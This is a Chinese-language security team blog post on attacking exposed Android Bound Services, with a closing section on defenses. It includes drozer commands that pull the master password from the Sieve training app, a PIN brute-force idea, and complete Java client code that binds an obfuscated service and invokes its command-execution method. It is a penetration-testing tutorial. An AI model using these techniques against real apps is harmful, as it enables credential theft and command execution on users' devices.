<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>Android Bound Service攻击 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android Bound Service攻击</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android Bound Service攻击</h1><div class="post-meta">2016-03-18<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.6k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 11</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="post-content"><h3 id="0x00-引子"><a href="#0x00-引子" class="headerlink" title="0x00 引子"></a>0x00 引子</h3><p>去年12月，[1] 讲述了针对android bound service的攻击方法，给出了从apk包中恢复AIDL文件的工具，利用AIDL便可以编写攻击Bound Service的Client。拜这篇文章所赐，笔者也在实际测试工作中发现了类似漏洞，其中的过程却有些曲折。作为白帽子，通常情况下很难直接得到或者恢复AIDL文件，这决定了Bound Service的易守难攻，因此需要更加系统地掌握Bound Sercive的测试方法，并辅以耐心和一定的运气，才能发现类似的漏洞。在[1]的基础上，本文将分享此类漏洞的经验，进一步对Bound Service攻击进行说明。</p>
<h3 id="0x01-Bound-Service简介"><a href="#0x01-Bound-Service简介" class="headerlink" title="0x01 Bound Service简介"></a>0x01 Bound Service简介</h3><p>Bound Service提供了一种基于Binder的跨进程调用(IPC)机制，在其Service类中实现OnBind方法并返回用于IPC的IBinder对象。根据官方文档[2]，实现Bound Service有以下三种方式：</p>
<ul>
<li>继承Binder类</li>
<li>使用Messenger</li>
<li>使用AIDL</li>
</ul>
<p>由于第一种方式主要在同一进程中使用，因此我们主要关注后两种情况，只要Bound Service暴露，那么便可以编写恶意app，通过Messenger和基于AIDL的Bound Service进行跨进程通信，传入污染的数据或者直接调用被攻击应用的功能，最终对安全产生非预期的影响。</p>
<h3 id="0x02-攻击Messenger"><a href="#0x02-攻击Messenger" class="headerlink" title="0x02 攻击Messenger"></a>0x02 攻击Messenger</h3><p>Messenger是一种轻量级的IPC方案，其底层实现也是基于AIDL的，从android.os.Messenger的两个构造函数可以看到一些Binder的痕迹。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    &#x2F;**</span><br><span class="line">36     * Create a new Messenger pointing to the given Handler.  Any Message</span><br><span class="line">37     * objects sent through this Messenger will appear in the Handler as if</span><br><span class="line">38     * &#123;@link Handler#sendMessage(Message) Handler.sendMessage(Message)&#125; had</span><br><span class="line">39     * been called directly.</span><br><span class="line">40     *</span><br><span class="line">41     * @param target The Handler that will receive sent messages.</span><br><span class="line">42     *&#x2F;</span><br><span class="line">43    public Messenger(Handler target) &#123;</span><br><span class="line">44        mTarget &#x3D; target.getIMessenger();</span><br><span class="line">45    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">140     * Create a Messenger from a raw IBinder, which had previously been</span><br><span class="line">141     * retrieved with &#123;@link #getBinder&#125;.</span><br><span class="line">142     *</span><br><span class="line">143     * @param target The IBinder this Messenger should communicate with.</span><br><span class="line">144     *&#x2F;</span><br><span class="line">145    public Messenger(IBinder target) &#123;</span><br><span class="line">146        mTarget &#x3D; IMessenger.Stub.asInterface(target);</span><br><span class="line">147    &#125;</span><br></pre></td></tr></table></figure>

<p>使用Messenger的Service典型实现中，一定会有一个继承于Handler的内部类，用来处理客户端发送过来的消息，测试方法就是检查Handler的handleMessage方法，观察发送特定的Message后会引起被攻击应用如何反应。Drozer中用于漏洞教学的Sieve程序给出了实际案例。</p>
<p>Sieve暴露了两个服务，这两个服务均使用Messenger进行跨进程通信</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.AuthService</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.CryptoService</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>

<p>查看AuthService的handleMessage方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> public void handleMessage(Message msg) &#123;</span><br><span class="line">...</span><br><span class="line">            Bundle v8 &#x3D; null;</span><br><span class="line">            int v7 &#x3D; 9234;</span><br><span class="line">            int v6 &#x3D; 7452;</span><br><span class="line">            AuthService.this.responseHandler &#x3D; msg.replyTo;</span><br><span class="line">            Object v2 &#x3D; msg.obj;</span><br><span class="line">            switch(msg.what) &#123;</span><br><span class="line">                case 4: &#123;</span><br><span class="line">                    &#x2F;&#x2F;Check if pin and password are set</span><br><span class="line">                &#125;</span><br><span class="line">                case 2354: &#123;</span><br><span class="line">                    if(msg.arg1 &#x3D;&#x3D; v6) &#123;</span><br><span class="line">                      &#x2F;&#x2F;Return pin Requires password from Bundle</span><br><span class="line">                    &#125;</span><br><span class="line">                    else if(msg.arg1 &#x3D;&#x3D; v7) &#123;</span><br><span class="line">&#x2F;&#x2F;Return password Requires pin from Bundle！！</span><br><span class="line">                        v1 &#x3D; 41;</span><br><span class="line">                        if(AuthService.this.verifyPin(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PIN&quot;))</span><br><span class="line">                                ) &#123;</span><br><span class="line">                            v2_1 &#x3D; new Bundle();</span><br><span class="line">                            v2_1.putString(&quot;com.mwr.example.sieve.PASSWORD&quot;, AuthService.this.getKey());</span><br><span class="line">                            v3 &#x3D; 0;</span><br><span class="line">                        &#125;</span><br><span class="line">...</span><br><span class="line">                    this.sendResponseMessage(5, v1, v3, v2_1);</span><br><span class="line">                    return;</span><br><span class="line">                label_57:</span><br><span class="line">                    this.sendUnrecognisedMessage();</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                case 6345: &#123;</span><br><span class="line">                    if(msg.arg1 &#x3D;&#x3D; v6) &#123;</span><br><span class="line">&#x2F;&#x2F;Set Password Requires Current Password from Bundle</span><br><span class="line">                        v1 &#x3D; 42;</span><br><span class="line">                        v3 &#x3D; AuthService.this.setKey(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PASSWORD&quot;))</span><br><span class="line">                                 ? 0 : 1;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else if(msg.arg1 &#x3D;&#x3D; v7) &#123;</span><br><span class="line">&#x2F;&#x2F;Set Pin Requires Current Pin from Bundle</span><br><span class="line">                        v1 &#x3D; 41;</span><br><span class="line">                        v3 &#x3D; AuthService.this.setPin(((Bundle)v2).getString(&quot;com.mwr.example.sieve.PIN&quot;))</span><br><span class="line">                                 ? 0 : 1;</span><br><span class="line">                    &#125;</span><br><span class="line">                    else &#123;</span><br><span class="line">                        goto label_99;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    this.sendResponseMessage(4, v1, v3, v8);</span><br><span class="line">                    return;</span><br></pre></td></tr></table></figure>
<p>AuthService根据传入Message对象的不同，执行不同的动作，注意当Message对象的what为2354，arg1为9234时，如果当前的PIN正确，则可返回Sieve使用的主password。Drozer提供了app.service.send模块，利用该模块可以很方便地测试基于Messenger的跨进程通信。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 0 --extra string com.mwr.example.sieve.PIN 1234 --bundle-as-obj</span><br><span class="line">Got a reply from com.mwr.example.sieve&#x2F;com.mwr.example.sieve.AuthService:</span><br><span class="line">  what: 5</span><br><span class="line">  arg1: 41</span><br><span class="line">  arg2: 0</span><br><span class="line">  Extras</span><br><span class="line">    com.mwr.example.sieve.PASSWORD (String) : passw0rd123123123</span><br></pre></td></tr></table></figure>
<p>如果PIN不正确，则只返回当前传入的PIN</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 33333 --extra string com.mwr.example.sieve.PIN 2344 --bundle-as-obj</span><br><span class="line">Got a reply from com.mwr.example.sieve&#x2F;com.mwr.example.sieve.AuthService:</span><br><span class="line">  what: 5</span><br><span class="line">  arg1: 41</span><br><span class="line">  arg2: 1</span><br><span class="line">  Extras</span><br><span class="line">    com.mwr.example.sieve.PIN (String) : 2344</span><br></pre></td></tr></table></figure>
<p>由于PIN只有4位，利用上述两种结果的不同，可以编写程序进行爆破。另外一个CryptoService同样也有类似的漏洞，通过传入特定的Message对象，执行加解密操作，可被用来解密password，详见[3]。</p>
<h3 id="0x03-攻击基于AIDL的Bound-Service"><a href="#0x03-攻击基于AIDL的Bound-Service" class="headerlink" title="0x03 攻击基于AIDL的Bound Service"></a>0x03 攻击基于AIDL的Bound Service</h3><p>文献[1]给出了一个存在命令执行漏洞的Bound Service，并根据Bound Service的apk生成AIDL接口文件，编写攻击程序调用Bound Service中的命令执行方法。然而，在使用中发现生成AIDL文件的工具主要根据smali文件中的Stub.Proxy类进行抓取，而当apk进行了混淆，便不能正确生成AIDL文件了。例如，我们配置build.gradle中的minifyEnabledtrue开关为true，使用Android Studio的默认混淆规则。对混淆的apk与未混淆的apk使用JEB逆向对比如下</p>
<p><img src="/2016/03/18/android-bound-service/contract.png" alt="image"></p>
<p>混淆后的apk少了许多有关AIDL的信息，没有了Stub Proxy这些特征，致使如下代码实现的GenerateAIDL工具出错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (descriptorToDot(interfaces.first()).equals(IINTERFACE_CLASS)) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;* Now grab the Stub.Proxy, to get the protocols *&#x2F;</span><br><span class="line">    String stubProxyName &#x3D; className + &quot;.Stub.Proxy&quot;;</span><br><span class="line">    DexBackedClassDef stubProxyDef &#x3D; getStubProxy(classDefs, stubProxyName);</span><br><span class="line">    if (stubProxyDef &#x3D;&#x3D; null) &#123;</span><br><span class="line">        System.err.println(&quot;[ERROR] Unable to find Stub.Proxy for class: &quot;</span><br><span class="line">                                                + stubProxyName + &quot;, Skiping!&quot;);</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p><img src="/2016/03/18/android-bound-service/noAIDL.png" alt="image"></p>
<p>由于AIDL文件本质上只是SDK为我们提供的一种快速实现Binder的工具，因此完全可以不依赖AIDL文件而实现Binder的方法，这也是在实际渗透测试过程中最常见的情况。下面我们结合有漏洞混淆后的apk进行说明。</p>
<p>怀疑暴露的ITestService可传入一个可控字符串执行命令后，我们可以按如下步骤编写Client去Bind该Service进行测试。</p>
<p>首先，可声明一个AIDL性质的接口，可直接拷贝JEB中继承IInterface的a接口，该接口有一个a方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; in fact a is TestInterface</span><br><span class="line">public interface a extends IInterface &#123;</span><br><span class="line">    static final String DESCRIPTOR &#x3D; &quot;com.jakev.boundserver.aidl.TestInterface&quot;;</span><br><span class="line">    String a(String arg1) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，编写实现a接口的Stub极其内部类Proxy，可参考系统生成的代码，结构略作调整使之清晰化。注意，一定要在Proxy类中实现a方法，其传入远程调用的code为1，打包数据data写入a方法中的字符串类型的参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">public class Stub extends Binder implements a &#123;</span><br><span class="line">    &#x2F;** Construct the stub at attach it to the interface. *&#x2F;</span><br><span class="line">    public Stub() &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.attachInterface(this, DESCRIPTOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;** Cast an IBinder object into an TestInterface(a) interface,</span><br><span class="line">     * generating a proxy if needed</span><br><span class="line">    *&#x2F;</span><br><span class="line">    public static a asInterface(IBinder obj) &#123;</span><br><span class="line">        if (obj &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        IInterface iin &#x3D; obj.queryLocalInterface(DESCRIPTOR);</span><br><span class="line">        if(((iin !&#x3D; null) &amp;&amp; (iin instanceof a))) &#123;</span><br><span class="line">            return (a)iin;</span><br><span class="line">        &#125;</span><br><span class="line">        return new Stub.Proxy(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public IBinder asBinder() &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">    public boolean onTransact(int code, Parcel data, Parcel reply, int flag) throws RemoteException&#123;</span><br><span class="line">        boolean v0 &#x3D; true;</span><br><span class="line">        switch(code) &#123;</span><br><span class="line">            case 1: &#123;</span><br><span class="line">                data.enforceInterface(DESCRIPTOR);</span><br><span class="line">                String v1 &#x3D; this.a(data.readString());</span><br><span class="line">                reply.writeNoException();</span><br><span class="line">                reply.writeString(v1);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            case 1598968902: &#123;</span><br><span class="line">                reply.writeString(DESCRIPTOR);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            default: &#123;</span><br><span class="line">                v0 &#x3D; super.onTransact(code, data, reply, flag);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return v0;</span><br><span class="line">    &#125;</span><br><span class="line">    public  String a(String cmd) throws RemoteException &#123;</span><br><span class="line">        &#x2F;&#x2F; Server do not have to implement this method, just return null</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class Proxy implements a &#123;</span><br><span class="line">        private IBinder mRemote;</span><br><span class="line">        Proxy(IBinder remote) &#123;</span><br><span class="line">            mRemote &#x3D; remote;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public IBinder asBinder() &#123;</span><br><span class="line">            return mRemote;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getInterfaceDescriptor() &#123;</span><br><span class="line">            return DESCRIPTOR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public String a(String cmd) throws RemoteException&#123;</span><br><span class="line">            String result &#x3D; null;</span><br><span class="line">            Parcel data &#x3D; Parcel.obtain();</span><br><span class="line">            Parcel reply &#x3D; Parcel.obtain();</span><br><span class="line">            try &#123;</span><br><span class="line">                data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">                data.writeString(cmd);</span><br><span class="line">                mRemote.transact(1, data, reply, 0);</span><br><span class="line">                reply.readException();</span><br><span class="line">                result &#x3D; reply.readString();</span><br><span class="line">            &#125;</span><br><span class="line">            finally &#123;</span><br><span class="line">                reply.recycle();</span><br><span class="line">                data.recycle();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，编写攻击app的Activity，在其中bind有漏洞的Service</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mServiceConnection &#x3D; new myServiceConnection();</span><br><span class="line">Intent i &#x3D; new Intent();</span><br><span class="line">i.setClassName(&quot;com.jakev.boundserver&quot;, &quot;com.jakev.boundserver.ITestService&quot;);</span><br><span class="line">boolean ret &#x3D; bindService(i, mServiceConnection, BIND_AUTO_CREATE);</span><br></pre></td></tr></table></figure>

<p>在ServiceConnection的回调函数中调用a方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public void onServiceConnected(ComponentName name, IBinder service) &#123;</span><br><span class="line">    Log.d(TAG, &quot;OnServiceConnected &quot;);</span><br><span class="line">    String command &#x3D; editCommand.getText().toString();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        a mTestService &#x3D; Stub.asInterface(service);</span><br><span class="line">        String result &#x3D; mTestService.a(command);</span><br><span class="line">        Log.d(TAG, &quot;exec result is:&quot; + result);</span><br><span class="line">        txtResult.setText(result);</span><br><span class="line">    &#125; catch (RemoteException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击效果如下<br><img src="/2016/03/18/android-bound-service/attackresult.png" alt="image"></p>
<p>至此，就完成了不依赖于AIDL文件攻击Bound Service的过程。</p>
<h3 id="0x04-攻击已注册的系统服务"><a href="#0x04-攻击已注册的系统服务" class="headerlink" title="0x04 攻击已注册的系统服务"></a>0x04 攻击已注册的系统服务</h3><p>通过adb shell service list可以查看在context manager（或servicemanager）中注册的系统服务名称和IBinder接口。</p>
<p><img src="/2016/03/18/android-bound-service/systemservice.png" alt="image"></p>
<p>这些服务也暴露了潜在的攻击面，可以编写客户端程序通过服务名获得Binder对象的引用，进而调用服务的功能或者传入污染的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sp&lt;IServiceManager&gt; sm &#x3D; defaultServiceManager();</span><br><span class="line">sp&lt;IBinder&gt; binder &#x3D; sm-&gt;getService(String16(&quot;demo&quot;)); &#x2F;&#x2F;demo is Service Name</span><br><span class="line">sp&lt;IDemo&gt; ServiceName &#x3D; interface_cast&lt;IDemo&gt;(binder);</span><br></pre></td></tr></table></figure>
<p>构造Parcel对象data后，则可以通过binder-&gt;transact(int code, Parcel data, Parcel reply, int flag)调用系统服务。或者在具有服务实现源代码的情况下，直接通过ServcieName-&gt;ServiceMethod()调用系统服务实现的方法，具体可参考[4]。</p>
<p>一般情况下，系统服务都有严格的权限检查机制，漏洞更是罕见，但也有案例。<br>如，<a href="http://www.wooyun.org/bugs/wooyun-2010-081867" target="_blank" rel="noopener">三星手机随意访问RILD接口（可以解除定制机网络制式的软限制）</a>，作者在POC中给两种访问ITelephony服务sendOemRilRequestRaw接口的方法（Java和C）。</p>
<h3 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h3><p>除了在Manifest文件中对暴露的Service增加Signature的保护级别外，Binder还提供了更为灵活的验证方式</p>
<ul>
<li>使用Binder的静态方法getCallingPid或者getCallingUid来验证IPC调用者的身份，在获得调用者uid以后，可进一步使用PackageManager.getPackagesForUid(int uid)来获得调用者的包名，然后使用PackageManager.getPackageInfo(String Packagename, int flag)检查是否具有相应的权限（使用PackageManager.GET_PERMISSIONS flag）</li>
<li>在Service的OnBind方法中调用Context.checkCallingPermission(String permission)或者checkCallingPermissionOrSelf (String permission) 方法，验证IPC调用者是否拥有指定的权限，同样适用于Messenger；</li>
<li>使用Context.enforceCallingPermission(String permission, String message)，如果调用者不具备权限，自动抛出SecurityException</li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1] <a href="http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1" target="_blank" rel="noopener">http://blog.thecobraden.com/2015/12/attacking-bound-services-on-android.html?m=1</a></p>
<p>[2] <a href="http://developer.android.com/guide/components/bound-services.html" target="_blank" rel="noopener">http://developer.android.com/guide/components/bound-services.html</a></p>
<p>[3] The Mobile Application Hackers Handbook</p>
<p>[4] <a href="http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/" target="_blank" rel="noopener">http://ebixio.com/blog/2012/07/07/using-android-ipc-binders-from-native-code/</a></p>
</div><div class="tags"><a href="/tags/Android/"><i class="fa fa-tag"></i>Android</a></div><div class="post-nav"><a class="pre" href="/2016/03/19/cknife-opensource/">跨平台版中国菜刀Cknife(C刀)更新开源</a><a class="next" href="/2016/03/01/es-explorer-vul/">ES文件浏览器组件暴露导致远程命令执行</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a 